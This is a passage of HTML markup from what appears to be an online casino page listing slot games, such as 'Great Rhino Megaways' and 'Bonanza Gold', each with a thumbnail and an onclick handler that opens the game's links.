                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aladdin and the Sorcerer" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aladdin and the Sorcerer', '/assets/games/i/165x220/71c521a864e8508291cd2ad121d37d15.webp?v=0.1' , 'vs20aladdinsorc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/71c521a864e8508291cd2ad121d37d15.webp?v=0.1" src="/assets/games/i/165x220/71c521a864e8508291cd2ad121d37d15.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aladdin and the Sorcerer">Aladdin and the Sorcerer</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Magic Journey" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Magic Journey', '/assets/games/i/165x220/4eb692b837404c35863bbaeddaac98b1.webp?v=0.1' , 'vs8magicjourn', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4eb692b837404c35863bbaeddaac98b1.webp?v=0.1" src="/assets/games/i/165x220/4eb692b837404c35863bbaeddaac98b1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Magic Journey">Magic Journey</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Greek Gods" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Greek Gods', '/assets/games/i/165x220/e051500bd4b9a702849900f70f40d20b.webp?v=0.1' , 'vs243fortseren', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e051500bd4b9a702849900f70f40d20b.webp?v=0.1" src="/assets/games/i/165x220/e051500bd4b9a702849900f70f40d20b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Greek Gods">Greek Gods</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Bonanza" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Bonanza', '/assets/games/i/165x220/2fcfff1bafcbfd02d236139818445100.webp?v=0.1' , 'vs7776aztec', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2fcfff1bafcbfd02d236139818445100.webp?v=0.1" src="/assets/games/i/165x220/2fcfff1bafcbfd02d236139818445100.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Bonanza">Aztec Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild West Gold" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild West Gold', '/assets/games/i/165x220/e8167456cc02394c0427a9e2048e3d39.webp?v=0.1' , 'vs40wildwest', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e8167456cc02394c0427a9e2048e3d39.webp?v=0.1" src="/assets/games/i/165x220/e8167456cc02394c0427a9e2048e3d39.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild West Gold">Wild West Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mysterious" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mysterious', '/assets/games/i/165x220/75195808358d687fac7a7018a234278f.webp?v=0.1' , 'vs4096mystery', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/75195808358d687fac7a7018a234278f.webp?v=0.1" src="/assets/games/i/165x220/75195808358d687fac7a7018a234278f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mysterious">Mysterious</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruit Rainbow" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruit Rainbow', '/assets/games/i/165x220/08a535ba0b937925f2b0140e6cfbc0f7.webp?v=0.1' , 'vs40frrainbow', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/08a535ba0b937925f2b0140e6cfbc0f7.webp?v=0.1" src="/assets/games/i/165x220/08a535ba0b937925f2b0140e6cfbc0f7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruit Rainbow">Fruit Rainbow</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Dragon Ball" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Dragon Ball', '/assets/games/i/165x220/4c720680fb3182ed50dbe6b37772b00e.webp?v=0.1' , 'vs1ball', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4c720680fb3182ed50dbe6b37772b00e.webp?v=0.1" src="/assets/games/i/165x220/4c720680fb3182ed50dbe6b37772b00e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Dragon Ball">Lucky Dragon Ball</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Great Rhino Megaways" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Great Rhino Megaways', '/assets/games/i/165x220/e8311fc119098dbe15b21af3d22e6581.webp?v=0.1' , 'vswaysrhino', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e8311fc119098dbe15b21af3d22e6581.webp?v=0.1" src="/assets/games/i/165x220/e8311fc119098dbe15b21af3d22e6581.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Great Rhino Megaways">Great Rhino Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dance Party" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dance Party', '/assets/games/i/165x220/2542201c4a1a9e6b5d63151eaa677662.webp?v=0.1' , 'vs243dancingpar', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2542201c4a1a9e6b5d63151eaa677662.webp?v=0.1" src="/assets/games/i/165x220/2542201c4a1a9e6b5d63151eaa677662.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dance Party">Dance Party</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Wild Machine" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Wild Machine', '/assets/games/i/165x220/128092af95fd760f18b10b4d69b6c05c.webp?v=0.1' , 'vs40madwheel', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/128092af95fd760f18b10b4d69b6c05c.webp?v=0.1" src="/assets/games/i/165x220/128092af95fd760f18b10b4d69b6c05c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Wild Machine">The Wild Machine</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruit Party" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruit Party', '/assets/games/i/165x220/84e5d2c5f0b1ffe4aab714d42530ca63.webp?v=0.1' , 'vs20fruitparty', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/84e5d2c5f0b1ffe4aab714d42530ca63.webp?v=0.1" src="/assets/games/i/165x220/84e5d2c5f0b1ffe4aab714d42530ca63.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruit Party">Fruit Party</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot to Burn" data-filter="ALL,CLASSIC" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot to Burn', '/assets/games/i/165x220/863e62510a9002187af43c5cd11bc921.webp?v=0.1' , 'vs5hotburn', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/863e62510a9002187af43c5cd11bc921.webp?v=0.1" src="/assets/games/i/165x220/863e62510a9002187af43c5cd11bc921.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot to Burn">Hot to Burn</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Drago - Jewels of Fortune" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Drago - Jewels of Fortune', '/assets/games/i/165x220/0ee9085f2fae525d12484bea04e73a54.webp?v=0.1' , 'vs1600drago', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0ee9085f2fae525d12484bea04e73a54.webp?v=0.1" src="/assets/games/i/165x220/0ee9085f2fae525d12484bea04e73a54.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Drago - Jewels of Fortune">Drago - Jewels of Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ultra Burn" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ultra Burn', '/assets/games/i/165x220/2b4cab4fe21e4105ce85315a6fada155.webp?v=0.1' , 'vs5ultrab', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2b4cab4fe21e4105ce85315a6fada155.webp?v=0.1" src="/assets/games/i/165x220/2b4cab4fe21e4105ce85315a6fada155.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ultra Burn">Ultra Burn</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pyramid King" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pyramid King', '/assets/games/i/165x220/0195332767c8d3f9e1f5848b696dcb37.webp?v=0.1' , 'vs25pyramid', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0195332767c8d3f9e1f5848b696dcb37.webp?v=0.1" src="/assets/games/i/165x220/0195332767c8d3f9e1f5848b696dcb37.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pyramid King">Pyramid King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Money Money Money™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Money Money Money™', '/assets/games/i/165x220/511e82dec302bae830f931e31442665c.webp?v=0.1' , 'vs1money', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/511e82dec302bae830f931e31442665c.webp?v=0.1" src="/assets/games/i/165x220/511e82dec302bae830f931e31442665c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Money Money Money™">Money Money Money™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Three Star Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Three Star Fortune', '/assets/games/i/165x220/02e196571c4184a61725edd431e5f0de.webp?v=0.1' , 'vs10threestar', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/02e196571c4184a61725edd431e5f0de.webp?v=0.1" src="/assets/games/i/165x220/02e196571c4184a61725edd431e5f0de.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Three Star Fortune">Three Star Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starz Megaways" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starz Megaways', '/assets/games/i/165x220/eded72c805b019536818722ff0c51ab0.webp?v=0.1' , 'vs117649starz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/eded72c805b019536818722ff0c51ab0.webp?v=0.1" src="/assets/games/i/165x220/eded72c805b019536818722ff0c51ab0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starz Megaways">Starz Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fu Fu Fu™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fu Fu Fu™', '/assets/games/i/165x220/9728f3bf6126cb476b0e23eac50c9769.webp?v=0.1' , 'vs1fufufu', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9728f3bf6126cb476b0e23eac50c9769.webp?v=0.1" src="/assets/games/i/165x220/9728f3bf6126cb476b0e23eac50c9769.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fu Fu Fu™">Fu Fu Fu™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Tiger Warrior™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Tiger Warrior™', '/assets/games/i/165x220/75663cda443ddb372e5d465c112018cf.webp?v=0.1' , 'vs25tigerwar', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/75663cda443ddb372e5d465c112018cf.webp?v=0.1" src="/assets/games/i/165x220/75663cda443ddb372e5d465c112018cf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Tiger Warrior™">The Tiger Warrior™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Street Racer™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Street Racer™', '/assets/games/i/165x220/5da2768320c19a1b87cd1c8dd484f4d8.webp?v=0.1' , 'vs40streetracer', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5da2768320c19a1b87cd1c8dd484f4d8.webp?v=0.1" src="/assets/games/i/165x220/5da2768320c19a1b87cd1c8dd484f4d8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Street Racer™">Street Racer™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Dog House Megaways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Dog House Megaways™', '/assets/games/i/165x220/d6e3f98c82e5fc7fe8148169a3fe1cd4.webp?v=0.1' , 'vswaysdogs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d6e3f98c82e5fc7fe8148169a3fe1cd4.webp?v=0.1" src="/assets/games/i/165x220/d6e3f98c82e5fc7fe8148169a3fe1cd4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Dog House Megaways™">The Dog House Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Star Bounty™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Star Bounty™', '/assets/games/i/165x220/542f3a2d819fe4ae80883bd2b4e826be.webp?v=0.1' , 'vswayshive', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/542f3a2d819fe4ae80883bd2b4e826be.webp?v=0.1" src="/assets/games/i/165x220/542f3a2d819fe4ae80883bd2b4e826be.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Star Bounty™">Star Bounty™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Curse of the Werewolf Megaways" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Curse of the Werewolf Megaways', '/assets/games/i/165x220/0816aa010c30efc689f1eea169c38d28.webp?v=0.1' , 'vswayswerewolf', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0816aa010c30efc689f1eea169c38d28.webp?v=0.1" src="/assets/games/i/165x220/0816aa010c30efc689f1eea169c38d28.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Curse of the Werewolf Megaways">Curse of the Werewolf Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gems Bonanza" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gems Bonanza', '/assets/games/i/165x220/6385d5483d88e4f0bf8f0ab71ba66d41.webp?v=0.1' , 'vs20goldfever', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6385d5483d88e4f0bf8f0ab71ba66d41.webp?v=0.1" src="/assets/games/i/165x220/6385d5483d88e4f0bf8f0ab71ba66d41.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gems Bonanza">Gems Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Lions Dance™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Lions Dance™', '/assets/games/i/165x220/7a88a782ff44b3b65c25ac016e3275f8.webp?v=0.1' , 'vs1024lionsd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7a88a782ff44b3b65c25ac016e3275f8.webp?v=0.1" src="/assets/games/i/165x220/7a88a782ff44b3b65c25ac016e3275f8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Lions Dance™">5 Lions Dance™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Great Rhino Deluxe" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Great Rhino Deluxe', '/assets/games/i/165x220/3cbd8992db1497b805543e3e06408029.webp?v=0.1' , 'vs20rhinoluxe', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3cbd8992db1497b805543e3e06408029.webp?v=0.1" src="/assets/games/i/165x220/3cbd8992db1497b805543e3e06408029.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Great Rhino Deluxe">Great Rhino Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise of Samurai™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise of Samurai™', '/assets/games/i/165x220/2a0ca31bf0c9cbe42a81732118936d7f.webp?v=0.1' , 'vs25samurai', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2a0ca31bf0c9cbe42a81732118936d7f.webp?v=0.1" src="/assets/games/i/165x220/2a0ca31bf0c9cbe42a81732118936d7f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise of Samurai™">Rise of Samurai™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ultra Hold and Spin" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ultra Hold and Spin', '/assets/games/i/165x220/4ac1259bdac8c7a893f291141522b478.webp?v=0.1' , 'vs5ultra', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4ac1259bdac8c7a893f291141522b478.webp?v=0.1" src="/assets/games/i/165x220/4ac1259bdac8c7a893f291141522b478.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ultra Hold and Spin">Ultra Hold and Spin</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Walker™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Walker™', '/assets/games/i/165x220/d60e787a058d8cfb33ff5255794612b2.webp?v=0.1' , 'vs25walker', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d60e787a058d8cfb33ff5255794612b2.webp?v=0.1" src="/assets/games/i/165x220/d60e787a058d8cfb33ff5255794612b2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Walker™">Wild Walker™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wild Riches" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wild Riches', '/assets/games/i/165x220/527ef8d23d99b7ae87a3ea2acad2ac49.webp?v=0.1' , 'vs576treasures', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/527ef8d23d99b7ae87a3ea2acad2ac49.webp?v=0.1" src="/assets/games/i/165x220/527ef8d23d99b7ae87a3ea2acad2ac49.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wild Riches">Wild Wild Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Spartan King™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Spartan King™', '/assets/games/i/165x220/81af53b93422df00bf0b69e40e8b81d6.webp?v=0.1' , 'vs40spartaking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/81af53b93422df00bf0b69e40e8b81d6.webp?v=0.1" src="/assets/games/i/165x220/81af53b93422df00bf0b69e40e8b81d6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Spartan King™">Spartan King™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Return of the Dead" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Return of the Dead', '/assets/games/i/165x220/3748ce955057f3dc5a2f7bb804d9a488.webp?v=0.1' , 'vs10returndead', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3748ce955057f3dc5a2f7bb804d9a488.webp?v=0.1" src="/assets/games/i/165x220/3748ce955057f3dc5a2f7bb804d9a488.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Return of the Dead">Return of the Dead</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="John Hunter and the Mayan Gods™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'John Hunter and the Mayan Gods™', '/assets/games/i/165x220/253989b6908fd3f92b640a68d843a99e.webp?v=0.1' , 'vs10mayangods', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/253989b6908fd3f92b640a68d843a99e.webp?v=0.1" src="/assets/games/i/165x220/253989b6908fd3f92b640a68d843a99e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="John Hunter and the Mayan Gods™">John Hunter and the Mayan Gods™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cowboys Gold™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cowboys Gold™', '/assets/games/i/165x220/6e45c202358391efe1b447687c5fc55f.webp?v=0.1' , 'vs10cowgold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6e45c202358391efe1b447687c5fc55f.webp?v=0.1" src="/assets/games/i/165x220/6e45c202358391efe1b447687c5fc55f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cowboys Gold™">Cowboys Gold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bonanza Gold™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bonanza Gold™', '/assets/games/i/165x220/8da7683040ef0a27e9a10ce77bb38185.webp?v=0.1' , 'vs20bonzgold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8da7683040ef0a27e9a10ce77bb38185.webp?v=0.1" src="/assets/games/i/165x220/8da7683040ef0a27e9a10ce77bb38185.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
